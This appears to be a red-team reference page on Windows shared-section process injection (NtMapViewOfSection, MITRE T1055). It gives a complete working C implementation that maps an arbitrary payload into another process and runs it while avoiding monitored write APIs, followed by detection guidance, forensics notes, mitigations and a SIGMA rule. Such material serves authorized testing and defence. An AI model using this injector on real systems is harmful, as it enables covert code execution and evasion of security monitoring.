# NT API-Based Injection (NtMapViewOfSection)

**MITRE ATT&CK**: T1055 - Process Injection

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

This technique uses shared memory sections (Windows section objects) to inject code
without calling WriteProcessMemory. A memory section is created, mapped into both
the local (injector) and remote (target) process, and the injector writes the payload
to its own local mapping. Because the section is shared, the written data is
immediately visible in the remote mapping.

The key evasion advantage: WriteProcessMemory (NtWriteVirtualMemory) is one of the
most monitored APIs for cross-process injection. This technique avoids it entirely.
The write happens to the injector's own local memory, which is normal behavior.

## Key Concepts

- **Section Object**: A Windows kernel object representing a region of shared memory.
  Created via NtCreateSection. Sections can be backed by a file (file mapping) or by
  the system pagefile (anonymous shared memory).
- **View**: A mapping of a section into a process's virtual address space. Created via
  NtMapViewOfSection. Multiple processes can map views of the same section.
- **Permission Asymmetry**: The local view can be mapped as RW (for writing), while
  the remote view is mapped as RX (for execution). This avoids RWX in either process.

## API Call Pattern

```
NtCreateSection (create shared memory section, PAGE_EXECUTE_READWRITE)
    --> NtMapViewOfSection (map into LOCAL process as RW)
    --> memcpy to local view (write payload -- appears as local memory write)
    --> NtMapViewOfSection (map into REMOTE process as RX)
    --> Execute in remote process (CreateRemoteThread, APC, etc.)
```

## C Implementation

```c
#include <windows.h>
#include <stdio.h>

/*
 * NT API section-based injection.
 *
 * These functions are not exported by kernel32 -- they must be resolved
 * from ntdll.dll at runtime via GetProcAddress.
 */

// NT API type definitions
typedef NTSTATUS(NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,  // NULL for anonymous
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle                     // NULL for pagefile-backed
);

typedef NTSTATUS(NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,  // ViewShare=1 or ViewUnmap=2
    ULONG AllocationType,
    ULONG Win32Protect         // Protection for this mapping
);

typedef NTSTATUS(NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

// NTSTATUS success check
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

int section_inject(DWORD targetPid, unsigned char *payload, SIZE_T payloadSize) {

    // Resolve NT API functions from ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection =
        (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection =
        (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection) {
        printf("[!] Failed to resolve NT APIs\n");
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 1: Create a shared memory section.
    // The section is pagefile-backed (FileHandle = NULL) and sized
    // to hold our payload. SECTION_ALL_ACCESS grants full control.
    // PAGE_EXECUTE_READWRITE allows both RW and RX views.
    // SEC_COMMIT commits the pages immediately.
    // ---------------------------------------------------------------
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = payloadSize;

    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,     // DesiredAccess
        NULL,                   // ObjectAttributes (anonymous)
        &sectionSize,           // MaximumSize
        PAGE_EXECUTE_READWRITE, // SectionPageProtection
        SEC_COMMIT,             // AllocationAttributes
        NULL                    // FileHandle (pagefile-backed)
    );
    if (!NT_SUCCESS(status)) {
        printf("[!] NtCreateSection failed: 0x%08X\n", status);
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 2: Map a view of the section into OUR (local) process as RW.
    // This gives us a writable pointer to the shared memory.
    // Writing to this pointer is a LOCAL memory operation -- it does
    // not trigger cross-process write monitoring.
    // ---------------------------------------------------------------
    PVOID localView = NULL;
    SIZE_T viewSize = 0;  // 0 = map entire section

    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),    // Map into our own process
        &localView,
        0,                      // ZeroBits
        payloadSize,            // CommitSize
        NULL,                   // SectionOffset
        &viewSize,
        2,                      // InheritDisposition: ViewUnmap
        0,                      // AllocationType
        PAGE_READWRITE          // Local view is Read-Write (for writing payload)
    );
    if (!NT_SUCCESS(status)) {
        printf("[!] NtMapViewOfSection (local) failed: 0x%08X\n", status);
        CloseHandle(hSection);
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 3: Write the payload to our LOCAL view.
    // Because this is shared memory, the bytes are immediately visible
    // in any other mapping of this section. This is a simple memcpy
    // to our own process memory -- no cross-process write API needed.
    // ---------------------------------------------------------------
    memcpy(localView, payload, payloadSize);

    // ---------------------------------------------------------------
    // STEP 4: Open the target process and map a view of the SAME
    // section into the target's address space as RX (Read-Execute).
    // The target now has an executable view of our payload without
    // any WriteProcessMemory call having occurred.
    // ---------------------------------------------------------------
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        NtUnmapViewOfSection(GetCurrentProcess(), localView);
        CloseHandle(hSection);
        return -1;
    }

    PVOID remoteView = NULL;
    SIZE_T remoteViewSize = 0;

    status = NtMapViewOfSection(
        hSection,
        hProcess,               // Map into TARGET process
        &remoteView,
        0,                      // ZeroBits
        payloadSize,            // CommitSize
        NULL,                   // SectionOffset
        &remoteViewSize,
        2,                      // InheritDisposition: ViewUnmap
        0,                      // AllocationType
        PAGE_EXECUTE_READ       // Remote view is Read-Execute (for execution)
    );
    if (!NT_SUCCESS(status)) {
        printf("[!] NtMapViewOfSection (remote) failed: 0x%08X\n", status);
        NtUnmapViewOfSection(GetCurrentProcess(), localView);
        CloseHandle(hProcess);
        CloseHandle(hSection);
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 5: Execute the payload in the remote process.
    // The remoteView pointer is the address in the target where the
    // payload is mapped. We use CreateRemoteThread here, but other
    // execution primitives (APC, thread hijack) could be used.
    // ---------------------------------------------------------------
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteView,
        NULL, 0, NULL
    );

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    // Cleanup: unmap local view, close handles
    NtUnmapViewOfSection(GetCurrentProcess(), localView);
    NtUnmapViewOfSection(hProcess, remoteView);
    CloseHandle(hProcess);
    CloseHandle(hSection);

    return 0;
}
```

## Permission Asymmetry Detail

```
Injector Process                     Target Process
+-------------------+                +-------------------+
|                   |                |                   |
|  localView (RW)   |--- shared  ---|  remoteView (RX)  |
|  We write here    |    section    |  Payload executes  |
|                   |    object     |  here              |
+-------------------+                +-------------------+

Shared Section Object (kernel)
- Single copy of physical pages
- Both views reference same pages
- Different virtual protections per-view
```

## Detection & Prevention

### Section Mapping Events

**ETW Provider: Microsoft-Windows-Kernel-Memory**: Emits events for section creation
and mapping operations. Cross-process NtMapViewOfSection calls are logged and can
be correlated to identify shared section injection.

**Sysmon Event ID 10 (ProcessAccess)**: The OpenProcess call with PROCESS_ALL_ACCESS
is still required and logged. However, the subsequent memory operations bypass
the WriteProcessMemory detection path.

### Cross-Process Section Views

The most specific detection: a section object that is mapped into two different
processes where one view is RW and the other is RX. Legitimate shared memory
(file mappings, named pipes, shared DLLs) typically does not use this pattern.

**Detection logic**:
1. Monitor NtMapViewOfSection calls via ETW or kernel callbacks
2. Track section handles and their associated mappings
3. Alert when the same section is mapped into process A as RW and process B as RX
4. Correlate with process A not being a known legitimate parent/provider

### Behavioral Indicators

1. **NtCreateSection with PAGE_EXECUTE_READWRITE**: Anonymous (non-file-backed)
   sections with execute permissions are uncommon in legitimate software. Most
   legitimate shared memory is PAGE_READWRITE without execute.

2. **Direct syscall usage**: Advanced variants resolve syscall numbers and invoke
   NtCreateSection / NtMapViewOfSection directly (bypassing ntdll hooks). The
   Microsoft-Windows-Threat-Intelligence ETW provider captures these at the
   kernel level regardless of userland hook evasion.

3. **No WriteProcessMemory in the chain**: The absence of NtWriteVirtualMemory
   in the API chain (while still achieving code execution in another process)
   is itself an anomaly that behavioral engines can flag when combined with
   other indicators (cross-process handle + section mapping + remote thread).

### Memory Forensics

- **Mapped section analysis**: In memory forensics, the VAD tree for the target
  process shows the injected region as a mapped section (not private memory).
  The section has no backing file, which distinguishes it from legitimate
  file-backed mappings (DLLs, data files).
- **Volatility `vadinfo`**: Shows VAD entries with type "Mapped" and protection
  EXECUTE_READ but no associated file object -- indicative of section injection.

### Prevention

- **Restricted handle access**: Processes protected by PPL (Protected Process Light)
  reject OpenProcess with the required access rights, preventing the remote mapping.
- **Code Integrity Guard (CIG)**: Processes with CIG enabled may reject execution
  from non-image-backed mapped sections.
- **Kernel-level section monitoring**: Security products using ObRegisterCallbacks
  can intercept and filter section object creation with execute permissions.
- **Windows Sandbox / AppContainer**: Sandboxed processes have restricted ability
  to open handles to processes outside their container, limiting the attack surface
  for cross-process section mapping.

### SIGMA Rule Sketch

```yaml
title: Suspicious Cross-Process Section Mapping with Execute Permission
logsource:
    product: windows
    category: kernel_memory
detection:
    selection:
        EventType: 'NtMapViewOfSection'
        TargetProcessId|ne: SourceProcessId  # Cross-process
        Protection|contains: 'EXECUTE'
    filter:
        SourceImage|endswith:
            - '\csrss.exe'
            - '\smss.exe'
    condition: selection and not filter
level: high
```
